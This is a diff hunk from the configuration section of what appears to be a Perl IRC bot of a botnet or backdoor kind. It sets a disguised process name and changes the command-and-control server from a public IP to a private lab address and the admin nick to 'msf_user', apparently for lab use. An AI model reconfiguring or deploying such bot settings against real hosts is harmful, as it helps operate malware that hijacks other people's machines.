@@ -26,14 +26,14 @@ my $sshhost = $argv[2];
 my $hidden = 'core';
 my $linas_max='4';
 my $sleep='5';
-my @admins=("HackTech","TheChozen","Zax");
+my @admins=("msf_user");
 my @hostauth=("legend.rocks");
-my @channels=("#Apache");
+my @channels=("#lol");
 my $nick= 'Apache';
 my $ircname = 'Zax';
 my $realname = '$uname';
-my $server='80.246.50.71';
-my $port='2015';
+my $server='192.168.93.137';
+my $port='6667';
 ###########################################################
 ####################[Configuration]########################
 ###########################################################
